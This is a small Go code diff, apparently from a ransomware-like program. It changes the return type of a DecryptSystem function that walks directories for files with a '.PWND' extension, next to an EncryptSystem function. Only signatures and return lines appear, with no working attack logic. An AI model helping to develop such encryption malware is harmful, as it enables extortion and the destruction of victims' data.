@@ -65,7 +65,7 @@ func EncryptSystem(root string, targets []string, key []byte) []string {
 	return files
 }
 
-func DecryptSystem(root string, key []byte) []string {
+func DecryptSystem(root string, key []byte) string {
 	var files []string
 	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
 		// We only care for files with the .PWND extension.
@@ -77,5 +77,5 @@ func DecryptSystem(root string, key []byte) []string {
 		return nil
 	})
 	checkError(err)
-	return files
+	return "done"
 }
